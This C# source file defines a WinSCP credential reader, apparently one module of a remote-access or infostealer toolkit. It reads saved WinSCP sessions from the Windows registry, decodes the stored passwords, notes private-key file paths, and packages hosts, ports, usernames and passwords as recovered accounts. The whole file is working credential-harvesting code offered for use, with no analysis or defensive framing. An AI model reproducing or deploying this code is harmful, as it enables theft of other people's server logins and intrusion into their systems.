using Everything.Extensions;
using Everything.Helper;
using Microsoft.Win32;
using Q3C273.Shared.Models;
using System;
using System.Collections.Generic;
using System.Linq;

namespace Everything.Recovery.FtpClients
{
    public class WinScpPassReader : IAccountReader
    {
        /// <inheritdoc />
        public string ApplicationName => "WinSCP";

        /// <inheritdoc />
        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            var data = new List<RecoveredAccount>();
            try
            {
                var regPath = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";

                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
                {
                    foreach (var subkeyName in key.GetSubKeyNames())
                    {
                        using (var accountKey = key.OpenReadonlySubKeySafe(subkeyName))
                        {
                            if (accountKey == null)
                                continue;
                            var host = accountKey.GetValueSafe("HostName");
                            if (string.IsNullOrEmpty(host))
                                continue;

                            var user = accountKey.GetValueSafe("UserName");
                            var password = WinSCPDecrypt(user, accountKey.GetValueSafe("Password"), host);
                            var privateKeyFile = accountKey.GetValueSafe("PublicKeyFile");
                            host += ":" + accountKey.GetValueSafe("PortNumber", "22");

                            if (string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(privateKeyFile))
                                password = string.Format("[PRIVATE KEY LOCATION: \"{0}\"]", Uri.UnescapeDataString(privateKeyFile));

                            data.Add(new RecoveredAccount
                            {
                                Url = host,
                                Username = user,
                                Password = password,
                                Application = ApplicationName
                            });
                        }
                    }
                }
                return data;
            }
            catch
            {
                return data;
            }
        }

        private int dec_next_char(List<string> list)
        {
            var a = int.Parse(list[0]);
            var b = int.Parse(list[1]);
            var f = 255 ^ ((a << 4) + b ^ 0xA3) & 0xff;
            return f;
        }

        private string WinSCPDecrypt(string user, string pass, string host)
        {
            try
            {
                if (user == string.Empty || pass == string.Empty || host == string.Empty)
                    return "";
                var qq = pass;
                var hashList = qq.Select(keyf => keyf.ToString()).ToList();
                var newHashList = new List<string>();
                for (var i = 0; i < hashList.Count; i++)
                {
                    if (hashList[i] == "A")
                        newHashList.Add("10");
                    if (hashList[i] == "B")
                        newHashList.Add("11");
                    if (hashList[i] == "C")
                        newHashList.Add("12");
                    if (hashList[i] == "D")
                        newHashList.Add("13");
                    if (hashList[i] == "E")
                        newHashList.Add("14");
                    if (hashList[i] == "F")
                        newHashList.Add("15");
                    if ("ABCDEF".IndexOf(hashList[i]) == -1)
                        newHashList.Add(hashList[i]);
                }
                var newHashList2 = newHashList;
                var length = 0;
                if (dec_next_char(newHashList2) == 255)
                    length = dec_next_char(newHashList2);
                newHashList2.Remove(newHashList2[0]);
                newHashList2.Remove(newHashList2[0]);
                newHashList2.Remove(newHashList2[0]);
                newHashList2.Remove(newHashList2[0]);
                length = dec_next_char(newHashList2);
                var newHashList3 = newHashList2;
                newHashList3.Remove(newHashList3[0]);
                newHashList3.Remove(newHashList3[0]);
                var todel = dec_next_char(newHashList2) * 2;
                for (var i = 0; i < todel; i++)
                {
                    newHashList2.Remove(newHashList2[0]);
                }
                var password = "";
                for (var i = -1; i < length; i++)
                {
                    var data = ((char)dec_next_char(newHashList2)).ToString();
                    newHashList2.Remove(newHashList2[0]);
                    newHashList2.Remove(newHashList2[0]);
                    password = password + data;
                }
                var splitdata = user + host;
                var sp = password.IndexOf(splitdata, StringComparison.Ordinal);
                password = password.Remove(0, sp);
                password = password.Replace(splitdata, "");
                return password;
            }
            catch
            {
                return "";
            }
        }
    }
}
